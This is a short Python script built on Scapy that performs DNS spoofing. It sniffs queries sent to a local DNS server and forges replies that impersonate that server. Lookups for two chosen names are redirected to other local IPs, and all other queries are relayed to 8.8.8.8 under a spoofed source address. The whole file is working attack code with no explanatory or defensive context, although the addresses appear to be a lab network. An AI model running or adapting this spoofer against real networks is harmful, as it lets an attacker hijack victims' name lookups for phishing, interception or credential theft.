#!/usr/bin/python
# Written by andy

from scapy.all import *
import sys

DNSServerIP = "192.168.0.201"
localIP = "192.168.0.15"

filter = "udp port 53 and ip dst " + DNSServerIP + " and not ip src " + DNSServerIP
def DNS_Responder(localIP):
	def forwardDNS(orig_pkt):
		print "Forwarding: " + orig_pkt[DNSQR].qname
		response = sr1(IP(dst="8.8.8.8",src=DNSServerIP)/UDP(sport=orig_pkt[UDP].sport)/\
			DNS(rd=1,id=orig_pkt[DNS].id,qd=DNSQR(qname=orig_pkt[DNSQR].qname)),verbose=0, timeout=1)
		respPkt = IP(dst=orig_pkt[IP].src,src=DNSServerIP)/UDP(dport=orig_pkt[UDP].sport)/DNS()
		respPkt[DNS] = response[DNS]
		send(respPkt,verbose=0)
		return "Responding: " + respPkt.summary()
	def getResponse(pkt):
		if (DNS in pkt and pkt[DNS].opcode == 0L and pkt[DNS].ancount == 0 and pkt[IP].src != DNSServerIP):
			if "nez.human.body" in pkt['DNS Question Record'].qname:
				spfResp = IP(dst=pkt[IP].src,src=DNSServerIP)\
					/UDP(dport=pkt[UDP].sport, sport=53)\
					/DNS(id=pkt[DNS].id,qr=1,qdcount=1,ancount=1,nscount=1,qd=DNSQR(qname=pkt[DNSQR].qname),an=DNSRR(rrname=pkt[DNSQR].qname,rdata="192.168.0.231"),ns=DNSRR(rrname="nez.human.body",rdata="192.168.0.231"))
				send(spfResp,verbose=0)
				return "Spoofed DNS Response Sent"
			else:
				if "test.org" in pkt['DNS Question Record'].qname:
					spfResp = IP(dst=pkt[IP].src,src=DNSServerIP)\
						/UDP(dport=pkt[UDP].sport, sport=53)\
						/DNS(id=pkt[DNS].id,qr=1,qdcount=1,ancount=1,nscount=1,qd=DNSQR(qname=pkt[DNSQR].qname),an=DNSRR(rrname=pkt[DNSQR].qname,rdata="192.168.0.232"),ns=DNSRR(rrname="test.org",rdata="192.168.0.232"))
					send(spfResp,verbose=0)
					return "Spoofed DNS Response Sent"
				else:
					return forwardDNS(pkt)
		else:
			return False
	return getResponse
sniff(filter=filter,prn=DNS_Responder(DNSServerIP))